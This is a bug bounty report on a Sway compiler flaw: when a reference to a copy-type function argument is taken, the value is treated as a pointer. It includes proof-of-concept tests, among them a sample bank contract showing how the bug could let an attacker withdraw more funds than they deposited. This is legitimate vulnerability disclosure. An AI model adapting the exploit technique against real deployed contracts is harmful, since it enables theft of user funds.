# Attackathon \_ Fuel Network 32859 - \[Smart Contract - Low] Incorrect argument pointer creation

Submitted on Fri Jul 05 2024 04:52:06 GMT-0400 (Atlantic Standard Time) by @anatomist for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32859

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/FuelLabs/sway/tree/7b56ec734d4a4fda550313d448f7f20dba818b59>

Impacts:

* Incorrect sway compilation leading to incorrect bytecode
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`compile_expression_to_ptr` treats all arguments as pointers, but copy type arguments will be values.

## Vulnerability Details

Sway allow users to take reference of values. The references may then be passed around and dereferenced later. However, when creating a pointer to a function argument, sway incorrect assumes all arguments are already pointers. If a pointer is a copy type, such as `u64`, `u32`, `u16`, `u8`, the compiler casts the integer directly to a pointer, which is incorrect.

```
let ptr_val = if is_argument {
    // The `ptr_to_int` instructions gets the address of a variable into an integer.
    // We then cast it back to a pointer.
    let ptr_ty = Type::new_ptr(context, ty);
    let int_ty = Type::get_uint64(context);
    let ptr_to_int = self.current_block.append(context).ptr_to_int(val, int_ty);
    let int_to_ptr = self
        .current_block
        .append(context)
        .int_to_ptr(ptr_to_int, ptr_ty);
    int_to_ptr
} else {
    ...
}
```

Confusion between values and pointer are dangerous because they will lead to incorrect execution results.

## Impact Details

As usual, it is hard to come up with a precise impact estimation of undefined behavior because it depends on what code the user writes. The best case scenario would be contracts that run into those bugs getting bricked, and the worst case scenario would be that incorrect program behaviors lead to loss of funds.

## References

* `https://github.com/FuelLabs/sway/blob/acded67b3ec77ce1753356ad46f7ae17290f2ee0/sway-core/src/ir_generation/function.rs#L322`

## Proof of concept

## Proof of Concept

Tests are run on sway commit `acded67b3ec77ce1753356ad46f7ae17290f2ee0`.

The assert fails because `get_ref` casts the `u64` to a `u64` pointer directly, so `*a` will actually read data from the address `100`.

```
#[inline(never)]
fn get_ref(n: u64) -> &u64 {
    &n
}

#[test]
fn test() -> () {
    let a = get_ref(100);

    assert(*a == 100);
}
```

We also provide a test to show how this bug can turn into a loss of funds bug. To run this as a unit test with `forc test`, you need to modify the test cli command to provide more input coins, the default is 1.

```
contract;

use std::hash::Hash;
use std::{
    call_frames::msg_asset_id,
    context::msg_amount,
};

const ADDRESS_ADMIN = Address::from(0x0000000000000000000000000000000000000000000000000000000000000003);

storage {
    bank: StorageMap<Address, u64> = StorageMap {},
    fee: u64 = 0,
}

struct Request<A, F, T> {
    amount: &A,
    from: &F,
    to: &T,
}

impl<A, F, T> Request<A, F, T> {
    fn new(amount: A, from: F, to: T) -> Request<A, F, T> {
        Request {
            amount: &amount,
            from: &from,
            to: &to,
        }
    }
}

abi Bank {
    #[payable]
    #[storage(read, write)]
    fn deposit_to(to: Address) -> ();

    #[storage(read, write)]
    fn withdraw_to(from: Address, to: b256, amount: u64) -> u64;
}

impl Bank for Contract {
    #[payable]
    #[storage(read, write)]
    fn deposit_to(to: Address) -> () {
        if msg_amount() == 0 {
            log("Amount is zero");
            revert(1);
        }

        if msg_asset_id() != AssetId::base() {
            log("Not base asset");
            revert(2);
        }

        storage.bank.insert(to, msg_amount());
    }

    #[storage(read, write)]
    fn withdraw_to(from: Address, to: b256, amount: u64) -> u64 {
        if let Some(value) = storage.bank.get(from).try_read() {
            let request = Request::new(amount, from, to);
            if value < amount {
                log("Insufficient balance");
                revert(3);
            }
            let withdrawn = distribute_withdrawal(request, value);
            storage.bank.insert(from, value - amount);
            withdrawn
        } else {
            log("Failed to get value from bank");
            revert(4);
        }
    }
}

#[storage(read, write)]
fn distribute_withdrawal(request: Request<u64, Address, b256>, value: u64) -> u64 {
    if (*request.from != ADDRESS_ADMIN) {
        storage.fee.write(storage.fee.read() + *request.amount / 2);
        __smo(*request.to, "withdraw", *request.amount - *request.amount / 2);
        *request.amount - *request.amount / 2
    } else {
        __smo(*request.to, "withdraw", *request.amount);
        *request.amount
    }
}

#[test]
fn arg_ref_casting_to_loss_of_funds() {
    const ADDRESS_ALICE = Address::from(0x0000000000000000000000000000000000000000000000000000000000000001);
    const ADDRESS_BOB   = Address::from(0x0000000000000000000000000000000000000000000000000000000000000002);

    let val: u64 = 100000;
    let ptr = __addr_of(&val);
    let ptr_int = asm(ptr: ptr) {
        ptr: u64
    };
    assert(ptr_int < 100000 / 2); //check profibility

    let bank = abi(Bank, CONTRACT_ID);
    bank.deposit_to{asset_id : AssetId::base().into(), coins: ptr_int}(ADDRESS_ALICE);
    bank.deposit_to{asset_id : AssetId::base().into(), coins: 100000}(ADDRESS_BOB);
    let withdrawn = bank.withdraw_to(ADDRESS_ALICE, 0x0000000000000000000000000000000000000000000000000000000000000010, ptr_int);
    assert(withdrawn > ptr_int); //assert profit
}
```
